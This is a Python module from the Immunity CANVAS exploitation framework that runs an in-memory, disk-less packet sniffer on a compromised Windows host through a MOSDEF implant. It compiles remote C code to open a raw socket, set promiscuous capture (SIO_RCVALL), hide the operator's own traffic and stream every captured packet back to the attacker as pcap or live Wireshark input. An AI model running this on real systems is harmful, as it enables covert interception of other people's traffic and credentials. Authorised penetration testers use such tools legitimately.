#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2004
# http://www.immunityinc.com/CANVAS/ for more information

#
# This is an implementation of an in-memory network sniffer
# using raw sockets on Windows.
#
# Command-line usage: One can stop the sniffer with CTRL-C
#

import sys
if "." not in sys.path: sys.path.append(".")

import os
import struct
import socket
import datetime

from localNode          import localNode
from exploitutils       import hexify
from libs.newsmb.Struct import Struct
from timeoutsocket      import Timeout
from MOSDEF.mosdefutils import intel_order
from ExploitTypes.localcommand import LocalCommand

NAME                   = "windows_sniffer"
DESCRIPTION            = "Windows remote mosdef network sniffer"
VERSION                = "0.5"
GTK2_DIALOG            = "dialog.glade2"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """

This is a remote in-memory (does not touch disk) packet sniffer that uses
raw sockets to capture packets on Windows.

It does not work with remote MOSDEF sockets (pivoting).
You can use it either via the graphical interface or the commandline.

The sniffer works on both Win32 and Win64 nodes.

Examples via commandlineInterface.py (Stop with CTRL-C):

See options:
Win32/MOSDEF$ runmodule windows_sniffer -h

Capture straight to pcap dumpfile:
Win32/MOSDEF$ runmodule windows_sniffer

Capture to pcap dumpfile and see packets in realtime via wireshark:
Win32/MOSDEF$ runmodule windows_sniffer -O wireshark:1 

"""

PROPERTY               = {}
PROPERTY['SITE']       = "Local"
PROPERTY['TYPE']       = "Commands"
PROPERTY['ARCH']       = [ ["Windows"] ]

DATALINK_RAW  = 101
# This is the trigger that we send in order to terminate the sniffer
# loop at the remote end. We send TRIGGER and when we receive it
# we know that the sniffer has stopped.
TRIGGER       = '\xFF\xAA\xFF\xAA'

class PCAPHeader(Struct):
    st = [
        ['magic_number'  , '<I', 0xa1b2c3d4],
        ['version_major' , '<H', 2],
        ['version_minor' , '<H', 4],
        ['thiszone'      , '<I', 0],
        ['sigfigs'       , '<I', 0],
        ['snaplen'       , '<I', 0],
        ['network'       , '<I', DATALINK_RAW],
    ]
    
class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.name           = NAME       
        self.snaplen        = 65535  # Amount of bytes to capture per packet
        self.addr_idx       = 0      # IP address (index) to bind RAW socket at
                                     # Available indices are logged when sniffer is executed
        self.filename       = None   # PCAP output filename
        self.dirname        = None   # Directory name for pcap files
        self.pipename       = '/tmp/canvaspipe'
        self.wireshark_path = '/usr/bin/wireshark'
        self.wireshark      = 0      # if 1, start wireshark for realtime display

        self.pipe           = None   # File object corresponding to self.pipename
        self.file           = None   # File object corresponding to self.filename

    def close_pipe(self):
        self.pipe = None

    def close_file(self):
        if self.file: self.file.close()
        self.file = None
        
    def terminate(self, node):
        """
        Stop the sniffer loop at remote end and wait for confirmation.
        """
        self.log('Terminating sniffer..')
        node.shell.writebuf(TRIGGER)
        buf = []
        
        while True:
            buf.append(node.shell.reliableread(1))
            if hexify(buf[-4:]) == hexify(TRIGGER):
                self.log('Successfully stopped sniffer at remote end')
                break
            
        self.close_pipe()
        self.close_file()
        node.shell.leave()

    def fail(self, msg=''):
        self.close_pipe()
        self.close_file()
        
        if msg: self.log(msg)
        self.setInfo('%s - done (ERROR)' % NAME)

    def make_pcap_pipe(self):
        if not os.path.exists(self.wireshark_path) or \
           not os.path.isfile(self.wireshark_path) or \
           not os.access(self.wireshark_path, os.X_OK):
            # Missing wireshark executable
            self.log('Could not execute %s, not enabling live packet streaming' % self.wireshark_path)
            return

        header = PCAPHeader()
        header['snaplen'] = self.snaplen
        
        if os.path.exists(self.pipename):
            os.remove(self.pipename)
            os.mkfifo(self.pipename)
        else:
            os.mkfifo(self.pipename)

        os.system('%s -k -i %s &' % (self.wireshark_path, self.pipename))
        self.pipe = open(self.pipename, "w")
        self.send_to_pipe(header.pack())

    def make_pcap_file(self):
        if not self.filename:
            t = datetime.datetime.now()
            filename = 'dumpfile_%s.pcap' % t.strftime("%m%d%Y%H%M%S")
        else:
            filename = self.filename

        filename = os.path.join(self.dirname, filename)        
        try:
            self.file = open(filename, 'wb')

            header = PCAPHeader()
            header['snaplen'] = self.snaplen
            
            self.file.write(header.pack())
            self.log('Saving packets to %s' % filename)
        except Exception:
            self.log('Could not open %s for output, PCAP writing aborted' % filename)
            
    
    def send_to_pipe(self, packet):
        try:
            self.pipe.write(packet)
        except Exception:
            self.log('You probably closed wireshark while the sniffer was running.  No longer attempting to send packets to wireshark')
            self.pipe = None

    def send_to_file(self, packet):
        try:
            self.file.write(packet)
        except Exception, ex:
            self.log('PCAP output error: %s' % ex)
            self.log('WARNING: PCAP file output aborted')
            self.file = None

    def rewrite_packet(self, data, sec, usec, olen):
        sec  &= 0xFFFFFFFF
        usec &= 0xFFFFFFFF
        
        return struct.pack('<I', sec) + struct.pack('<I', usec) + \
               struct.pack('<I', len(data)) + struct.pack('<I', olen) + \
               data

    def getargs(self):
        self.wireshark      = int(self.argsDict.get('wireshark', self.wireshark))
        self.filename       = self.argsDict.get('filename', self.filename)
        self.wireshark_path = self.argsDict.get('wireshark_path', self.wireshark_path)
        self.addr_idx       = int(self.argsDict.get('addr_idx', self.addr_idx))
        self.snaplen        = int(self.argsDict.get('snaplen', self.snaplen))
                             
    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        node     = self.argsDict['passednodes'][0]
        type     = node.nodetype.lower()
        nodename = node.getname()

        if isinstance(node, localNode):
            self.fail('Node of type %s not supported.' % type)
            return 0
            
        if "win32api" not in node.capabilities:

            return 0

        if type not in ['win32node', 'win64node']:
            self.fail('Node of type %s not supported yet.' % type)
            return 0

        if self.snaplen <= 0:
            self.fail('Error: snaplen should be > 0, aborting..')
            return 0

        self.dirname = self.output(ip=node.get_interesting_interface(), subdir='pcap_files')

        hostname = node.shell.gethostname()

        if not hostname:
            self.fail('Could not grab hostname, aborting..')
            return 0

        self.log('Remote hostname: %s' % hostname)
        ret, addrs = node.shell.gethostbyname(hostname, parse=False)

        if ret == 0:
            self.fail(addrs)
            return 0

        if not addrs:
            self.fail('Could not get list of remote IP addresses, aborting..')
            return 0

        self.log('='*20 + ' ADDRESSES ' + '='*20)
        
        for idx, addr in enumerate(addrs):
            self.log('%d:\t %s' % (idx, socket.inet_ntoa(intel_order(addr))))

        if self.addr_idx < 0 or self.addr_idx > len(addrs)-1:
            self.fail('Invalid address given, aborting..')
            return 0
                    
        self.log('Initiating packet capture on %s' % socket.inet_ntoa(intel_order(addrs[self.addr_idx])))
        
        vars = {
            'AF_INET'    : socket.AF_INET,
            'SOCK_RAW'   : socket.SOCK_RAW,
            'IPPROTO_IP' : socket.IPPROTO_IP,
            'FD'         : node.shell.fd,
            'ADDR'       : addrs[self.addr_idx],
            'SNAPLEN'    : self.snaplen,
        }
        
        code = """
        #import "REMOTE", "ws2_32.dll|socket"          as "socket"
        #import "REMOTE", "ws2_32.dll|bind"            as "bind"
        #import "REMOTE", "ws2_32.dll|WSAIoctl"        as "WSAIoctl"
        #import "REMOTE", "ws2_32.dll|recv"            as "recv"
        #import "REMOTE", "ws2_32.dll|WSARecv"         as "WSARecv"
        #import "REMOTE", "ws2_32.dll|WSASocketA"      as "WSASocketA"
        
        #import "REMOTE", "ws2_32.dll|select"          as "select"
        #import "REMOTE", "ws2_32.dll|ioctlsocket"     as "ioctlsocket"
        #import "REMOTE", "ws2_32.dll|getpeername"     as "getpeername"

        #import "local", "memset"          as "memset"
        #import "local", "memcpy"          as "memcpy"
        #import "local", "malloc"          as "malloc"
        #import "local", "free"            as "free"
        #import "local", "sendint"         as "sendint"

        #import "local", "sendstring"      as "sendstring"
        #import "local", "writeblock2self" as "writeblock2self"
        """

        if type == 'win32node':
            code = code.replace("REMOTE", "remote")
            code += """
            #import "int", "FD" as "FD"
            """
        else:
            code = code.replace("REMOTE", "local")
            code += """
            #import "local", "sendlonglong"    as "sendlonglong"
            #import "long long", "FD" as "FD"
            """

        code += """
        #import "int",       "AF_INET"    as "AF_INET"
        #import "int",       "SOCK_RAW"   as "SOCK_RAW"
        #import "int",       "IPPROTO_IP" as "IPPROTO_IP"
        #import "int",       "ADDR"       as "ADDR"
        #import "int",       "SNAPLEN"    as "SNAPLEN"

        struct sockaddr_in {
            short   sin_family;
            short   sin_port;
            int     sin_addr;
            char    sin_zero[8];
        };

        struct timeval {
            int tv_sec;
            int tv_usec;
        };

        struct iphdr {
            char  ver;
            char  tos;
            short total_length;
            short id;
            char  frag;
            char  frag_offset;
            char  ttl;
            char  protocol;
            short checksum;
            int   srcaddr;
            int   destaddr;
        };

        struct wsabuf {
            int  len;
            char *buf;
        };
        """

        if type == 'win32node':
            code += """
            struct fd_set {
                int count;
                int fd;
            };
            """
        else:
            code += """
            struct fd_set {
                int count;
                long long fd;
            };
            """

        code += """
        void main()
        {
        """

        if type == 'win32node':
            code += """
            int raw_sock;
            """
        else:
            code += """
            long long raw_sock;
            """
        code += """
            int ret;
            
            int i;
            int k;
            int l;

            struct fd_set read_set;

            char *buf;
        
            struct sockaddr_in dst;
            struct timeval tv;
            struct wsabuf wbuf;
            
            struct iphdr   *ihdr;

            // CREATE RAW SOCKET
            raw_sock = WSASocketA(AF_INET, SOCK_RAW, IPPROTO_IP, 0, 0, 1);
            """
        if type == 'win32node':
            code += """
            sendint(raw_sock);
            """
        else:
            code += """
            sendlonglong(raw_sock);
            """
            
        code += """
            if (raw_sock == -1) {
                return;
            }

            // BIND RAW SOCKET    
            memset(&dst, 0, 16);
            i = ADDR;
            memcpy(&dst.sin_addr, &i, 4);
            dst.sin_family = AF_INET;
            dst.sin_port = 0;

            ret = bind(raw_sock, &dst, 16);
            sendint(ret);

            if (ret == -1) {
                return;
            }

            // PROMISC SIO_RCVALL
            i = 1;
            k = 0;
            ret = WSAIoctl(raw_sock, 0x98000001, &i, 4, 0, 0, &k, 0, 0);

            sendint(ret);

            if (ret == -1) {
                return;
            }

            // MALLOC
            buf = malloc(SNAPLEN);

            // GETPEERNAME
            i = 16;
            memset(&dst, 0, 16);
            ret = getpeername(FD, &dst, &i);

            sendint(ret);

            if (ret != 0) {
                free(buf);
                return;
            }
            
            sendint(dst.sin_addr);
            sendint(dst.sin_port);

            // CAPTURE LOOP
            while (1) {
                read_set.count = 1;
                read_set.fd = raw_sock;

                tv.tv_sec   = 1;
                tv.tv_usec  = 0;

                ret = select(2, &read_set, 0, 0, &tv);

                if (ret == -1) {
                    sendint(ret);
                    free(buf);
                    return;
                }


                if (ret > 0) {
                    k = 0;
                    l = 0;

                    wbuf.len = SNAPLEN;
                    wbuf.buf = buf;
                
                    ret = WSARecv(raw_sock, &wbuf, 1, &k, &l, 0, 0);

                    if (ret < 0) {
                        sendint(ret);
                        free(buf);
                        return;
                    }

                    ret  = k;
                    ihdr = wbuf.buf;
                
                    if (ihdr->destaddr != dst.sin_addr) {
                        if (ihdr->srcaddr != dst.sin_addr) {
                            sendint(ret);
                            writeblock2self(wbuf.buf, ret);
                        }
                    }
                }

                read_set.count = 1;
                read_set.fd    = FD;

                tv.tv_sec   = 0;
                tv.tv_usec  = 1;

                ret = select(2, &read_set, 0, 0, &tv);


                if (ret > 0) {
                    i = 0;
                    recv(FD, &i, 4, 0);
                    sendint(i);
                    free(buf);
                    return;
                }
            }
        }
        """

        node.shell.clearfunctioncache()
        request = node.shell.compile(code, vars)
        node.shell.sendrequest(request)

        if type == 'win32node':
            raw_sock = node.shell.readint(signed=True)
        else:
            raw_sock = node.shell.readlonglong(signed=True)
        
        if raw_sock == -1:
            self.fail('Could not create raw socket (permission/access), aborting..')
            node.shell.leave()
            return 0
        
        self.log('Creating RAW socket: %d' % raw_sock)

        ret = node.shell.readint(signed=True)
        
        if ret == -1:
            self.fail('Could not bind() raw socket, aborting..')
            node.shell.leave()
            return 0

        ret = node.shell.readint(signed=True)        
        if ret == -1:
            self.fail('Could not set SIO_RCVALL, aborting..')
            node.shell.leave()
            return 0


        ret = node.shell.readint()
        if ret != 0:
            self.fail('getpeername: error, aborting..')
            node.shell.leave()
            return 0


        self.log('getpeername: %s:%d' % (socket.inet_ntoa(intel_order(node.shell.readint())),
                                         socket.ntohs(node.shell.readint())))
        
        self.log('Capturing...')
        
        if self.wireshark == 1: self.make_pcap_pipe()
        self.make_pcap_file()
        
        try:
            while True:
                try:
                    node.shell.connection.set_timeout(1)
                    status = node.shell.readint(signed=True)
                    node.shell.connection.set_timeout(None)

                    if (status == -1 or status == 0):
                        self.fail('Error during packet capture, aborting..')
                        node.shell.leave()
                        return 0

                    buf = node.shell.readbuf(status)
                    buf = self.rewrite_packet(buf, 1, 1, len(buf))

                    if self.pipe: self.send_to_pipe(buf)
                    if self.file: self.send_to_file(buf)
                    
                except Timeout:
                    node.shell.connection.set_timeout(None)
                    if self.getState() == self.HALT: break
                    continue
        except KeyboardInterrupt:
            node.shell.connection.set_timeout(None)
            self.log('Caught CTRL-C, aborting..')

        self.terminate(node)
        self.setInfo("%s - done (success)"%(NAME))
        return 1
